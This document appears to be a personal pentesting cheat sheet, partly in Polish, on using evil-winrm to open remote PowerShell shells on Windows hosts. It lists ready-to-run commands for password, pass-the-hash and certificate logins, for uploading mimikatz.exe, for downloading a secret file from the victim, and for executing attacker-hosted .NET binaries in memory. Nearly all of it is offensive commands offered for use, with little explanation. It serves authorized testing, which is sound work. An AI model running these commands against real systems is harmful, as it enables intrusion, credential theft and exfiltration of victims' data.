# Windows Remote Management shell for pentesting.
Wykorzystuje WinRM do utworzenia shella

```powershell
evil-winrm -i <target-ip> -u username -p password

# -P: Specifify port
evil-winrm -i <target-ip> -P 5986 -u username -p password

# Pass The Hash (-H)
evil-winrm -i <target-ip> -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc

# PowerShell Local Path (-s)
evil-winrm -i <target-ip> -u username -p password -s /opt/scripts

# SSL enabled (-S)
evil-winrm -i <target-ip> -u username -p password -S
```
If you have private key and public key, you can use them for authentication.

```sh
# -S: SSL
# -k: private key
# -c: public key
evil-winrm -i <target-ip> -S -k private.key -c public.key
```

https://exploit-notes.hdks.org/exploit/windows/protocol/winrm-pentesting/

|                 |                                         |
| --------------- | --------------------------------------- |
| `-i <IP>`       | IP hosta                                |
| `-P <port>`     | port (można pominąć, wybierze domyślny) |
| `-u ... -p ...` | login i hasło użytkownika               |

# Pass-the-hash
```bash
# Pass The Hash (-H)
evil-winrm -i <target-ip> -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc
```

# File transfer
```powershell
$ evil-winrm -u username -p 'passwd' -i host
(*evil-winrm*) PS> upload /opt/Windows/exploits/executables/mimikatz.exe C:\temp\mimikatz.exe
(*evil-winrm*) PS> download C:\temp\supersecret.txt /opt/Juggernaut/JUGG-Backup/supersecret.txt
```

# Executing Files and Scripts Directly from Attacker (NO TRANSFER NEEDED)
https://juggernaut-sec.com/windows-file-transfers-for-hackers/#Downloading_Files_onto_the_Victim_Using_evil-winrm

To execute binaries from our attacker machine we need to use evil-winrm’s custom built-in **Invoke-Binary** function.

```powershell
$ evil-winrm -u backup_svc -p 'Makemoney1!' -i 172.16.1.10 -e /usr/share/windows-resources -s /usr/share/windows-resources
$ bash>evil-winrm -u ...
# nawiązanie połączenia z ofiaą za pomocą evil-winrm
PS> menu
PS> Invoke-Binary /usr/share/windows-resources
```
* Not all of these binaries will work with evil-winrm, since it only allows .Net assemblies (executables compiles from C#) to be executed in memory.
* To load PS1 scripts into the evil-winrm session is as simple as just executing any script by name. Since the **-s** switch points to our scripts directory, we can double tab to see all of our PS1 scripts available.
